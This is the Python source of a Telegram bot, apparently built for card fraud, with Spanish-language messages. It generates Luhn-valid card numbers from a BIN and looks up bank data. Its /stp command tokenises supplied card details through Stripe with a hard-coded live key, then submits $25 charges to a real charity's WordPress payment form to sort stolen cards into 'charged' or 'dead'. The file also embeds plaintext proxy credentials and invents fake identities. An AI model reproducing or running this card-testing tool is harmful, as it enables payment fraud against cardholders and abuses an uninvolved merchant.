import logging
import os
import requests
import time
import string
import random
import yaml
import asyncio
import re

from aiogram import Bot, Dispatcher, executor, types
from aiogram.utils.exceptions import Throttled
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from bs4 import BeautifulSoup as bs


# Configure vars get from env or config.yml
CONFIG = yaml.load(open('config.yml', 'r'), Loader=yaml.SafeLoader)
TOKEN = os.getenv('TOKEN', CONFIG['token'])
BLACKLISTED = os.getenv('BLACKLISTED', CONFIG['blacklisted']).split()
PREFIX = os.getenv('PREFIX', CONFIG['prefix'])
OWNER = int(os.getenv('OWNER', CONFIG['owner']))
ANTISPAM = int(os.getenv('ANTISPAM', CONFIG['antispam']))

# Initialize bot and dispatcher
storage = MemoryStorage()
bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot, storage=storage)

# Configure logging
logging.basicConfig(level=logging.INFO)

# BOT INFO
loop = asyncio.get_event_loop()

bot_info = loop.run_until_complete(bot.get_me())
BOT_USERNAME = bot_info.username
BOT_NAME = bot_info.first_name
BOT_ID = bot_info.id

# USE YOUR ROTATING PROXY API IN DICT FORMAT http://user:pass@providerhost:port
proxies = {
           'http': 'http://xdixelha-rotate:znl0jp6ckhsf@p.webshare.io:80/',
           'https': 'http://xdixelha-rotate:znl0jp6ckhsf@p.webshare.io:80/'
}

session = requests.Session()

# Random DATA
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for i in range(6))
Last = ''.join(random.choice(letters) for i in range(6))
PWD = ''.join(random.choice(letters) for i in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'


def gen(first_6: int, mm: int=None, yy: int=None, cvv: int=None):
    BIN = 15-len(str(first_6))
    card_no = [int(i) for i in str(first_6)]  # To find the checksum digit on
    card_num = [int(i) for i in str(first_6)]  # Actual account number
    seventh_15 = random.sample(range(BIN), BIN)  # Acc no (9 digits)
    for i in seventh_15:
        card_no.append(i)
        card_num.append(i)
    for t in range(0, 15, 2): 
        # odd position digits
        card_no[t] = card_no[t] * 2
    for i in range(len(card_no)):
        if card_no[i] > 9:  # deduct 9 from numbers greater than 9
            card_no[i] -= 9
    s = sum(card_no)
    mod = s % 10
    check_sum = 0 if mod == 0 else (10 - mod)
    card_num.append(check_sum)
    card_num = [str(i) for i in card_num]
    cc = ''.join(card_num)
    if mm is None:
        mm = random.randint(1, 12)
    if len(str(mm)) < 2:
        mm = f'0{mm}'
    else:
        mm = mm
    if yy is None:
        yy = random.randint(2023, 2028)
    else:
        yy = yy
    if cvv is None:
        cvv = random.randint(000, 999)
    if len(str(cvv)) <= 2:
        cvv = 999
    else:
        cvv = cvv
    return f'{cc}|{mm}|{yy}|{cvv}'


async def is_owner(user_id):
    status = False
    if user_id == OWNER:
        status = True
    return status


@dp.message_handler(commands=['start', 'cmds', 'help'], commands_prefix=PREFIX)
async def helpstr(message: types.Message):
    # await message.answer_chat_action('typing')
    keyboard_markup = types.InlineKeyboardMarkup(row_width=3)
    btns = types.InlineKeyboardButton("Owner", url="https://t.me/DiegoAkk")
    keyboard_markup.row(btns)
    FIRST = message.from_user.first_name
    MSG = f'''
𝐇𝐨𝐥𝐚 𝐩𝐚𝐢 {FIRST}, 𝐌𝐢 𝐧𝐨𝐦𝐛𝐫𝐞 𝐞𝐬 {BOT_NAME}
𝐂𝐡𝐞𝐜𝐤𝐞𝐚 𝐭𝐮𝐬 𝐜𝐜 𝐚 𝐠𝐮𝐬𝐭𝐨, 𝐩𝐚𝐫𝐚 𝐞𝐬𝐨 𝐦𝐞 𝐡𝐢𝐜𝐢𝐞𝐫𝐨𝐧 𝐱𝐃. 𝐌𝐢 𝐎𝐰𝐧𝐞𝐫 𝐞𝐬: <a href="tg://user?id={OWNER}">DiegoAkk</a>
𝙔 𝙚𝙨𝙩𝙤𝙨 𝙨𝙤𝙣 𝙢𝙞𝙨 𝙘𝙤𝙢𝙖𝙣𝙙𝙤𝙨: /gen /me /id /chk /info /bin'''
    await message.answer(MSG, reply_markup=keyboard_markup,
                        disable_web_page_preview=True)


@dp.message_handler(commands=['info', 'me', 'id'], commands_prefix=PREFIX)
async def info(message: types.Message):
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        is_bot = message.reply_to_message.from_user.is_bot
        username = message.reply_to_message.from_user.username
        first = message.reply_to_message.from_user.first_name
    else:
        user_id = message.from_user.id
        is_bot = message.from_user.is_bot
        username = message.from_user.username
        first = message.from_user.first_name
    await message.reply(f'''
═════════╕
<b>USER INFO</b>
<b>USER ID:</b> <code>{user_id}</code>
<b>USERNAME:</b> @{username}
<b>FIRSTNAME:</b> {first}
<b>BOT:</b> {is_bot}
<b>BOT-OWNER:</b> {await is_owner(user_id)}
╘═════════''')


@dp.message_handler(commands=['bin'], commands_prefix=PREFIX)
async def binio(message: types.Message):
    await message.answer_chat_action('typing')
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    BIN = message.text[len('/bin '):]
    if len(BIN) < 6:
        return await message.reply(
                   '𝙀𝙨𝙘𝙧𝙞𝙗𝙚 𝙪𝙣 𝙗𝙞𝙣 𝙫á𝙡𝙞𝙙𝙤 𝙬𝙣'
        )
    r = requests.get(
               f'https://bins.ws/search?bins={BIN[:6]}'
    ).text
    soup = bs(r, features='html.parser')
    k = soup.find("div", {"class": "page"})
    INFO = f'''
{k.text[62:]}
𝐂𝐇𝐊𝐁𝐘: <a href="tg://user?id={ID}">{FIRST}</a>
𝗕𝗢𝗧⇢ @{BOT_USERNAME}
𝗢𝗪𝗡𝗘𝗥⇢ <a href="tg://user?id={OWNER}">DiegoAkk</a>
'''
    await message.reply(INFO)


@dp.message_handler(commands=['gen'], commands_prefix=PREFIX)
async def genrate(message: types.Message):
    await message.answer_chat_action('typing')
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    if len(message.text) == 0:
        return await message.reply("<b>Format:\n /gen 549184</b>")
    try:
        x = re.findall(r'\d+', message.text)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        cards = gen(first_6=ccn, mm=mm, yy=yy, cvv=cvv)
    except IndexError:
        if len(x) == 1:
            for i in range(0, 20):
                cards = gen(first_6=ccn)
        elif len(x) == 3:
            cards = gen(first_6=ccn, mm=mm, yy=yy)
        elif len(mm) == 3:
            cards = gen(first_6=ccn, cvv=mm)
        elif len(mm) == 4:
            cards = gen(first_6=ccn, yy=mm)
        else:
            cards = gen(first_6=ccn, mm=mm)
    await asyncio.sleep(3)
    DATA = f'''
𝘾𝘾𝙎 𝙂𝙀𝙉𝙀𝙍𝘼𝘿𝘼𝙎 𝘿𝙀: <code>{ccn}</code>
------------------------------------------------
<code>{cards}</code>
------------------------------------------------
[🝂] 𝙂𝙚𝙣𝙚𝙧𝙖𝙙𝙖𝙨 𝙥𝙤𝙧: <a href="tg://user?id={ID}">{FIRST}</a>
[🝂] 𝗕𝗢𝗧⇢ @{BOT_USERNAME}
[🝂] 𝗢𝗪𝗡𝗘𝗥⇢ <a href="tg://user?id={OWNER}">DiegoAkk</a>
'''
    await message.reply(DATA)


@dp.message_handler(commands=['stp'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    try:
        await dp.throttle('stp', rate=ANTISPAM)
    except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
    else:
        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text[len('/stp '):]

        if len(cc) == 0:
            return await message.reply("<b>🔱 Stripe Charged 25$ 🔱</b>")

        x = re.findall(r'\d+', cc)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        if mm.startswith('2'):
            mm, yy = yy, mm
        if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm
        if len(ccn) < 15 or len(ccn) > 16:
            return await message.reply('<b>Failed to parse Card</b>\n'
                                       '<b>Reason: Invalid Format!</b>')   
        BIN = ccn[:6]
        if BIN in BLACKLISTED:
            return await message.reply('<b>BLACKLISTED BIN</b>')
        # get guid muid sid
        headers = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

        # b = session.get('https://ip.seeip.org/', proxies=proxies).text

        s = session.post('https://m.stripe.com/6', headers=headers)
        r = s.json()
        Guid = r['guid']
        Muid = r['muid']
        Sid = r['sid']

        postdata = {
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "key": "pk_live_YJm7rSUaS7t9C8cdWfQeQ8Nb",
            "card[name]": Name,
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv
        }

        HEADER = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": UA,
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "accept-language": "en-US,en;q=0.9"
        }

        pr = session.post('https://api.stripe.com/v1/tokens',
                          data=postdata, headers=HEADER)
        Id = pr.json()['id']

        # hmm
        load = {
            "action": "wp_full_stripe_payment_charge",
            "formName": "BanquetPayment",
            "fullstripe_name": Name,
            "fullstripe_email": Email,
            "fullstripe_custom_amount": "25.0",
            "fullstripe_amount_index": 0,
            "stripeToken": Id
        }

        header = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": UA,
            "origin": "https://archiro.org",
            "referer": "https://archiro.org/banquet/",
            "accept-language": "en-US,en;q=0.9"
        }

        rx = session.post('https://archiro.org/wp-admin/admin-ajax.php',
                          data=load, headers=header)
        msg = rx.json()['msg']

        toc = time.perf_counter()

        if 'true' in rx.text:
            return await message.reply(f'''
<b>- - - - - - - 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 25$ - - - - - - </b>

<b>[♤]𝐂𝐂</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>[♤]𝐒𝐓𝐀𝐓𝐔𝐒</b>➟ #CHARGED 25$ 💰
<b>[♤]𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄</b>➟ {msg}
<b>[♤]𝐓𝐎𝐎𝐊:</b> <code>{toc - tic:0.2f}</code>(s)
<b>[♤]𝐂𝐇𝐊𝐁𝐘</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>[♤]𝐎𝐖𝐍𝐄𝐑</b>: {await is_owner(ID)}
<b>[♤]𝐁𝐎𝐓</b>: @{BOT_USERNAME}''')

        if 'security code' in rx.text:
            return await message.reply(f'''
<b>- - - - - - - 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 25$ - - - - - - </b>

<b>[🝂]𝐂𝐂</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>[🝂]𝐒𝐓𝐀𝐓𝐔𝐒</b>➟ #CCN ✅
<b>[🝂]𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄</b>➟ <b>{msg}</b>
<b>[🝂]𝐓𝐎𝐎𝐊:</b> <code>{toc - tic:0.2f}</code>(s)
<b>[🝂]𝐂𝐇𝐊𝐁𝐘</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>[🝂]𝐎𝐖𝐍𝐄𝐑</b>: {await is_owner(ID)}
<b>[🝂]𝐁𝐎𝐓</b>: @{BOT_USERNAME}''')

        if 'false' in rx.text:
            return await message.reply(f'''
<b>- - - - - - - 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 25$ - - - - - - </b>

<b>[🝂]𝐂𝐂</b> <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>[🝂]𝐒𝐓𝐀𝐓𝐔𝐒</b> #Declined ❌
<b>[🝂]𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄</b> <b>{msg}</b>
<b>[🝂]𝐓𝐎𝐎𝐊:</b> <code>{toc - tic:0.2f}</code>(s)
<b>[🝂]𝐂𝐇𝐊𝐁𝐘</b> <a href="tg://user?id={ID}">{FIRST}</a>
<b>[🝂]𝐎𝐖𝐍𝐄𝐑</b>: {await is_owner(ID)}
<b>[🝂]𝐁𝐎𝐓</b>: @{BOT_USERNAME}''')

        await message.reply(f'''
<b>- - - - - - - 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 25$ - - - - - - </b>

<b>[🝂]𝐂𝐂</b> <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>[🝂]𝐒𝐓𝐀𝐓𝐔𝐒</b> DEAD ❌
<b>[♤]𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄</b> {rx.text}
<b>[♤]𝐓𝐎𝐎𝐊:</b> <code>{toc - tic:0.2f}</code>(s)
<b>[♤] 𝐂𝐇𝐊𝐁𝐘</b> <a href="tg://user?id={ID}">{FIRST}</a>
<b>[♤]𝐎𝐖𝐍𝐄𝐑</b>: {await is_owner(ID)}
<b>[♤]𝐁𝐎𝐓</b>: @{BOT_USERNAME}''')


if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, loop=loop)
